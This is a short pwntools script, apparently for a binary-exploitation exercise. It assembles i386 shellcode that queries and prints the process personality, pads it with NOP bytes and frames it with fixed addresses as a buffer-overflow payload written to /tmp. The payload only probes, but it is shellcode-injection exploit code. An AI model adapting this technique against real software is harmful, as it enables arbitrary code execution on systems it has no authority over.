from pwn import *

context.clear(arch="i386", os="linux")

probe = asm("""
    /* personality(0xffffffff) */
    push -1
    pop ebx
    xor eax, eax
    mov al, 136
    int 0x80

    /* write(1, &result, 4) */
    push eax
    mov ecx, esp
    push 4
    pop edx
    push 1
    pop ebx
    push 4
    pop eax
    int 0x80

    /* _exit(0) */
    xor ebx, ebx
    push 1
    pop eax
    int 0x80
""")

payload = (
        p32(0x0804a010) +
        probe.ljust(104, b"\x90") +
        p32(0x0804a00c)
)

open("/tmp/personality.bin", "wb").write(payload)
